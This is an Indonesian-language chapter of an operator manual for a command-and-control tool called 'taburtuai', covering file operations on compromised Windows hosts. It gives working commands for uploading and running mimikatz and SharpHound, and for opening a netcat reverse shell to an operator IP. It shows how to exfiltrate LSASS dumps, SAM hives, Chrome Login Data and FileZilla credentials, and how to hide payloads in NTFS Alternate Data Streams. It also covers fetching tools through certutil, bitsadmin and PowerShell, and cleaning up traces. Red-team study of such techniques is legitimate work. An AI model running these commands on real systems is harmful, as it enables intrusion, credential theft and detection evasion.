# 06 — File Operations

## Upload File ke Target

### `files upload <id> <local-file> <remote-path>`

Kirim file dari mesin operator ke mesin target.

```
taburtuai(IP:PORT) › files upload 2703886d /tools/mimikatz.exe "C:\Temp\svc.exe"
```

```
[*] Uploading /tools/mimikatz.exe → C:\Temp\svc.exe (1.2 MB)...
[+] File uploaded successfully.
    Remote path : C:\Temp\svc.exe
    Size        : 1,248,920 bytes
    SHA256      : a1b2c3d4e5f6...
```

### Contoh Upload

```
# Upload tool ke Temp
files upload 2703886d nc.exe "C:\Windows\Temp\nc.exe"

# Upload ke direktori yang ada spasi
files upload 2703886d config.xml "C:\Users\windows\AppData\Roaming\Microsoft\config.xml"

# Upload skrip PowerShell
files upload 2703886d enum.ps1 "C:\Temp\enum.ps1"

# Upload ke share kalau ada akses
files upload 2703886d payload.exe "\\SERVER\Share\payload.exe"
```

### Setelah Upload — Jalankan File

```
# Jalankan binary yang sudah diupload
cmd 2703886d "C:\Temp\svc.exe"

# Jalankan PowerShell script
cmd 2703886d "powershell -ep bypass -f C:\Temp\enum.ps1"

# Jalankan dengan argumen
cmd 2703886d "C:\Temp\nc.exe 172.23.0.118 4444 -e cmd.exe"
```

---

## Download File dari Target

### `files download <id> <remote-file> <local-path>`

Ambil file dari mesin target ke mesin operator.

```
taburtuai(IP:PORT) › files download 2703886d "C:\Temp\lsass.dmp" ./lsass.dmp
```

```
[*] Downloading C:\Temp\lsass.dmp → ./lsass.dmp (84.3 MB)...
[+] File downloaded successfully.
    Local path : ./lsass.dmp
    Size       : 88,371,200 bytes
    SHA256     : f7e8d9c0a1b2...
```

### Contoh Download

```
# Download SAM database
files download 2703886d "C:\Windows\Temp\sam" ./sam

# Download konfigurasi sensitif
files download 2703886d "C:\Users\windows\AppData\Roaming\FileZilla\sitemanager.xml" ./filezilla.xml

# Download credential file browser
files download 2703886d "C:\Users\windows\AppData\Local\Google\Chrome\User Data\Default\Login Data" ./chrome_login

# Download hasil LSASS dump
files download 2703886d "C:\Temp\ls.dmp" ./lsass.dmp

# Download log
files download 2703886d "C:\Windows\System32\winevt\Logs\Security.evtx" ./security.evtx
```

---

## Alternate Data Stream (ADS) — Sembunyikan File di NTFS

Windows NTFS mendukung **Alternate Data Stream** — cara menyimpan data tersembunyi di
dalam metadata file. File yang berisi ADS terlihat normal di Explorer dan `dir`,
tapi ADS-nya tidak terlihat kecuali kalau tahu cara melihatnya.

### Kapan Pakai ADS

- Sembunyikan tool tanpa meninggalkan file baru di folder
- Simpan payload di dalam file yang sudah legitimate
- Hindari deteksi berdasarkan file creation event

### `ads write` — Tulis File ke ADS

Tulis konten file lokal ke dalam ADS sebuah file di target.

```
taburtuai(IP:PORT) › ads write 2703886d ./nc.exe "C:\Windows\System32\calc.exe:nc"
```

```
[+] Written nc.exe (45,056 bytes) → C:\Windows\System32\calc.exe:nc
```

File `calc.exe` tetap berfungsi normal. `nc.exe` tersimpan di ADS `:nc`.

### `ads read` — Baca dari ADS

Ambil konten ADS ke file lokal.

```
taburtuai(IP:PORT) › ads read 2703886d "C:\Windows\System32\calc.exe:nc" ./nc_retrieved.exe
```

```
[+] Read C:\Windows\System32\calc.exe:nc (45,056 bytes) → ./nc_retrieved.exe
```

### `ads exec` — Eksekusi Script dari ADS via LOLBin

Eksekusi script JavaScript atau VBScript yang disimpan di ADS menggunakan `wscript.exe`
(LOLBin — binary Microsoft yang signed).

```
# Simpan script ke ADS
ads write 2703886d ./payload.js "C:\Windows\temp\document.docx:stream.js"

# Eksekusi via wscript (LOLBin)
ads exec 2703886d "C:\Windows\temp\document.docx:stream.js"
```

```
[+] Executing C:\Windows\temp\document.docx:stream.js via wscript.exe
[+] Script executed.
```

**Kenapa ini menarik:**
- `wscript.exe` adalah binary Microsoft yang selalu ada di Windows
- Eksekusi berasal dari proses `wscript.exe`, bukan dari binary mencurigakan
- File script "tidak terlihat" karena tersimpan di ADS

### Lihat ADS yang Ada (untuk Verifikasi)

```
# Di shell agent
cmd 2703886d "dir /r C:\Windows\System32\calc.exe"
```

Output:
```
04/23/2026  10:00 AM       830,976 calc.exe
                            45,056 calc.exe:nc:$DATA
```

---

## LOLBin File Download — `fetch`

Download file dari URL eksternal ke target menggunakan LOLBin (binary bawaan Windows).
Berguna ketika harus download tool tambahan dari internet ke target tanpa membuat koneksi
baru yang mencurigakan dari agent.

### Metode yang Tersedia

| Method | Binary | Karakteristik |
|---|---|---|
| `certutil` (default) | certutil.exe | Selalu ada di Windows, tapi sudah dikenal |
| `bitsadmin` | bitsadmin.exe | Background download, terlihat seperti Windows Update |
| `curl` | curl.exe | Ada di Windows 10 1803+, lebih natural |
| `powershell` | powershell.exe | WebClient, sangat kompatibel |

### Syntax

```
fetch <id> <url> <remote-path> [--method METHOD] [--wait]
```

### Contoh

```
# Download dengan certutil (default)
fetch 2703886d http://172.23.0.118:8888/tools/nc.exe "C:\Temp\nc.exe" --wait

# Download dengan bitsadmin (tampak seperti Windows Update download)
fetch 2703886d http://172.23.0.118:8888/tools/nc.exe "C:\Temp\nc.exe" --method bitsadmin --wait

# Download dengan curl
fetch 2703886d http://172.23.0.118:8888/tools/mimikatz.exe "C:\Temp\m.exe" --method curl --wait

# Download dengan PowerShell WebClient
fetch 2703886d http://172.23.0.118:8888/tools/enum.ps1 "C:\Temp\enum.ps1" --method powershell --wait
```

### Setup File Server Cepat untuk Fetch

Di mesin operator:

```bash
# Python HTTP server sederhana
python3 -m http.server 8888 --directory ./tools

# Atau dengan Caddy untuk HTTPS
caddy file-server --browse --root ./tools --listen :8888
```

---

## Scenario: Kirim Tool → Eksekusi → Ambil Hasil

Contoh workflow lengkap untuk enumeration dengan tool eksternal:

```
# 1. Upload tool ke target
files upload 2703886d /tools/SharpHound.exe "C:\Temp\svc.exe" --wait

# 2. Jalankan tool
cmd 2703886d "C:\Temp\svc.exe --CollectionMethods All --OutputDirectory C:\Temp" --timeout 300 --wait

# 3. Download hasil
files download 2703886d "C:\Temp\20260423_BloodHound.zip" ./bloodhound_output.zip

# 4. Cleanup
cmd 2703886d "del C:\Temp\svc.exe && del C:\Temp\*BloodHound*"
```

---

**Selanjutnya:** [07 — Persistence](07-persistence.md)
